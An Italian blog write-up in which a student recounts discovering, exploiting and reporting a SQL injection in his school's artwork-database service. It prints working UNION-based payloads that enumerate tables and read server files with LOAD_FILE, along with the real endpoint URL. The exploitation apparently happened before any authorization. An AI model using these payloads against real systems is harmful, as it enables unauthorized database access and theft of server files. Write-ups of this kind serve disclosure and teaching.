---
title: Come ho bucato un servizio della mia scuola
date: 2025-05-02
tags: [sqli, websec, writeup]
excerpt: Il racconto di come ho scoperto e segnalato una SQL injection in un servizio della mia scuola.
---

## Scoperta della vulnerabilità
Tutto è iniziato durante un corso di programmazione Flutter per docenti. Durante la lezione, il docente ha mostrato un'applicazione che comunicava con un endpoint simulato, rappresentante un'ipotetica API per la gestione di un database di artisti.

![image](posts/assets/SJdIR4Gexe.png)

Spinto dalla curiosità, ho analizzato il comportamento di questa pagina osservando il codice sorgente, dove ho trovato la seguente funzione JavaScript:

```js
function getOpereArtista() {
    const artista = document.getElementById("selectArtisti").value;

    fetch("https://riservata.itis.pr.it/dbarte/controller.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `funzione=getOpereArtista&artista=${encodeURIComponent(artista)}`
    })
    .then(response => {
                // qua controlla se ci sono davvero i dati...
    })
    .then(data => {
        // qua gestisce i dati e li stampa... 
    })
    .catch(error => console.error("Errore:", error));
}
```

Come si può notare, la funzione invia una richiesta `POST` a uno script `controller.php`, includendo l'input dell'utente (`artista`) dopo averlo codificato con `encodeURIComponent`. 

Questo mi ha portato a chiedermi: **e se il controllo sull’input fosse effettuato solo lato client?**

## L'exploit
Dato questo dubbio ho dunque aperto [PostMan](https://www.postman.com/downloads/) ed ho provato a simulare la richiesta manualmente: 
![image](posts/assets/HJRU_Bzexe.png)

Dopo avere verificato la presenza di un [SQLI](https://it.wikipedia.org/wiki/SQL_injection), ho approfondito la vulnerabilità provando a leggere le tabelle con la query:
```sql
' UNION SELECT GROUP_CONCAT(0x7c, table_name, 0x7c) FROM information_schema.tables -- -
```
che però restituiva `null`.. riflettendo ho ipotizzato che il motivo principale del fallimento di una SQLI Union based è spesso il numero di valori che vengono ritornati che non coincide con la prima query, questo mi ha fatto ripensare alla query di prima che, rileggendola, possiamo vedere che restituisce 10 parametri, perciò ho modificato la mia query in:

```sql
' UNION SELECT GROUP_CONCAT(0x7c, table_name, 0x7c), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables -- -
```
![image](posts/assets/H1u0_HGegg.png)

e boom, ero dentro al DB della mia scuola come root.

## Risoluzione della vuln
Ovviamente dopo aver accertato la vulnerabilità ho subito contattato il docente responsabile e l'ho avvisato del problema.
Dopo aver avuto la certezza che non voleva picchiarmi, sapendo che il sito si trovava su xampp, tramite una query sql ho preso il codice del sito
```sql
' UNION SELECT LOAD_FILE("C:\xampp\htdocs\dbarte\classDB.php"), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL -- -
```
e la sera stessa gli ho mandato tramite email la versione del codice corretto e senza vulnerabilità.
